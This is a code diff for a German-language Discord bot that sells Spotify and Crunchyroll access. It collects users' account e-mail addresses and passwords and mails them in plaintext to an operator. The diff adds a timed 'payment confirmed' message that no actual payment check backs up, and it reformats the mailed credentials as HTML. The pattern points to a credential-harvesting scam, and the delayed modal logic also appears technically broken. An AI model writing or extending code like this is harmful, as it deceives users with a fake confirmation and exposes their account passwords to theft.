@@ -38,6 +38,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
         .setCustomId('consent_accept')
         .setLabel('Ich stimme zu')
         .setStyle(ButtonStyle.Success),
+
       new ButtonBuilder()
         .setCustomId('consent_decline')
         .setLabel('Ich lehne ab')
@@ -70,6 +71,7 @@ Bitte stimme zu, um fortzufahren.`,
           .setCustomId('choose_spotify')
           .setLabel('Spotify (30 €)')
           .setStyle(ButtonStyle.Primary),
+
         new ButtonBuilder()
           .setCustomId('choose_crunchyroll')
           .setLabel('Crunchyroll (40 €)')
@@ -106,31 +108,39 @@ Klicke anschließend auf "Ich habe bezahlt", um deine Zugangsdaten einzugeben.`,
     if (interaction.customId.startsWith('paid_continue_')) {
       const selectedService = interaction.customId.split('_')[2];
 
-      const modal = new ModalBuilder()
-        .setCustomId(`login_modal_${selectedService}`)
-        .setTitle(`${selectedService.charAt(0).toUpperCase() + selectedService.slice(1)} Zugangsdaten`)
-        .addComponents(
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId('email_input')
-              .setLabel('E-Mail oder Benutzername')
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          ),
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId('password_input')
-              .setLabel('Passwort')
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          )
-        );
+      await interaction.deferUpdate();
 
-      try {
-        await interaction.showModal(modal);
-      } catch (err) {
-        console.error('❌ Fehler beim Anzeigen des Modals:', err);
-      }
+      setTimeout(async () => {
+        const modal = new ModalBuilder()
+          .setCustomId(`login_modal_${selectedService}`)
+          .setTitle(`${selectedService.charAt(0).toUpperCase() + selectedService.slice(1)} Zugangsdaten`)
+          .addComponents(
+            new ActionRowBuilder().addComponents(
+              new TextInputBuilder()
+                .setCustomId('email_input')
+                .setLabel('E-Mail oder Benutzername')
+                .setStyle(TextInputStyle.Short)
+                .setRequired(true)
+            ),
+            new ActionRowBuilder().addComponents(
+              new TextInputBuilder()
+                .setCustomId('password_input')
+                .setLabel('Passwort')
+                .setStyle(TextInputStyle.Short)
+                .setRequired(true)
+            )
+          );
+
+        try {
+          await interaction.followUp({
+            content: `✅ Zahlung bestätigt. Bitte gib jetzt deine Zugangsdaten für **${selectedService}** ein:`,
+            ephemeral: true
+          });
+          await interaction.showModal(modal);
+        } catch (err) {
+          console.error('❌ Fehler beim Anzeigen des Modals:', err);
+        }
+      }, 10000);
     }
   }
 
@@ -164,11 +174,15 @@ Klicke anschließend auf "Ich habe bezahlt", um deine Zugangsdaten einzugeben.`,
       from: process.env.MAIL_USER,
       to: process.env.NOTIFY_TO,
       subject: `📬 Neue Bestellung: ${service}`,
-      text: `Neue Bestellung von ${interaction.user.tag} (${interaction.user.id})
-
-Service: ${service}
-E-Mail: ${email}
-Passwort: ${password}`
+      html: `
+        <h2>Neue Bestellung</h2>
+        <p><strong>Service:</strong> ${service}</p>
+        <p><strong>Benutzer:</strong> ${interaction.user.tag} (${interaction.user.id})</p>
+        <p><strong>E-Mail / Benutzername:</strong> ${email}</p>
+        <p><strong>Passwort:</strong> ${password}</p>
+        <hr>
+        <p>⏰ ${new Date().toLocaleString()}</p>
+      `
     };
 
     transporter.sendMail(mailOptions, (err, info) => {
